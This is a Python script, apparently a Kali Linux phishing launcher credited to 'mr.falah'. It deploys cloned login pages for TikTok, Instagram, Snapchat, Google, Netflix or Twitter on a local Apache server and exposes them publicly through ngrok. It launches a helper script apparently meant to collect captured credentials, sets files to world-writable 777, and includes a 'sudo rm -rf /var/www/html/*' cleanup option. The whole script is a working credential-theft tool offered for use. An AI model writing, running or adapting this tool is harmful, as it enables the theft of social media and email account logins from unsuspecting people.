#!/usr/bin/python

import os
import time
import sys
os.system("resize -s 90 150")
os.system("clear")  
print ('\x1b[0;36;40m' + '''

8888888888888   8888888888888    88888888888888   88            88888888888
88         88             88     88               88           8           8
88         88            88      88               88          8             8
88         88           88       88888888888888   88          8              8
88         88          88        88               88          8              8
88         88         88         88               88           8            8
88         88        88          88               88            8          8
8888888888888       888888888888 88               888888888888   8888888888

This is a gift from mr.falah
''''\x1b[0m')
input = raw_input

yn = input ('\x1b[1;31;40m' +'do you want to Start (N)o To stop  , or (Y)es To start our project : ''\x1b[0m')
os.system("clear")
if yn =="Y" or yn=="y":
   print ('\x1b[1;37;40m' +'''
                                                                                                      

                                    %                                       
                                     ^                                      
                            L                                               
                            "F3  $r                                         
                           $$$$.e$"  .                                      
                           "$$$$$"   "                                      
     (DzFLO)                 $$$$c  /                                       
        .                   $$$$$$$P                                        
       ."c                      $$$                                         
      .$c3b                  ..J$$$$$e                                      
      4$$$$             .$$$$$$$$$$$$$$c                                    
       $$$$b           .$$$$$$$$$$$$$$$$r                                   
          $$$.        .$$$$$$$$$$$$$$$$$$                                   
           $$$c      .$$$$$$$  "$$$$$$$$$r                                  


Author   : Falah
snapchat : flaah999

           
now our project started 
This tool is made for kali linux 
===================================  
            
            ''''\x1b[0m')
   print ('\x1b[1;32;40m' +'press (0) to clean apache''\x1b[0m')
   print ('\x1b[1;32;40m' +"press (1) to Run our Project"'\x1b[0m')
   print ('\x1b[6;31;40m' +"Any key to Exit "'\x1b[0m')

     
else:
#bashi start
   os.system("clear")
   print ("Bye Bye have a good night ;") 
   os.system("sudo service apache2 stop") #stp-apch
   sys.exit()

st = raw_input ('\x1b[1;32;42m' +'Enter your decision .... : ''\x1b[0m')

if st =="1":
   os.system("clear")
   os.system("sudo service apache2 start")
   os.system("chmod 777 ngrok")
elif st =="0":#clean
    os.system("sudo rm -rf /var/www/html/*")
    os.system("clear")
    print "Now apache is clean 3:)"
    sys.exit()  
   
else:
     print ("Bye honey ;) ")
     os.system("sudo service apache2 stop")
     sys.exit()
   #options


print ('\x1b[1;32;40m' +'(1)  TikTok ''\x1b[0m')
print ('\x1b[1;32;40m' +'(2)  instagram ''\x1b[0m')
print ('\x1b[1;32;40m' +'(3)  snapchat ''\x1b[0m')
print ('\x1b[1;32;40m' +'(4)  google ''\x1b[0m')
print ('\x1b[1;32;40m' +'(5)  netflix ''\x1b[0m')
print ('\x1b[1;32;40m' +'(6)  twitter ''\x1b[0m')
stphish = input ("wich type of phishing do you want to use ? : ")

if stphish =="1":
    os.system("cp -a sites/TikTok/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="2":
    os.system("cp -a sites/instagram/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="3":
    os.system("cp -a sites/snapchat/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="4":
    os.system("cp -a sites/google/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="5":
    os.system("cp -a sites/netflix/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="6":
    os.system("cp -a sites/twitter/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
else:
    print ("ok exit ^_* ")
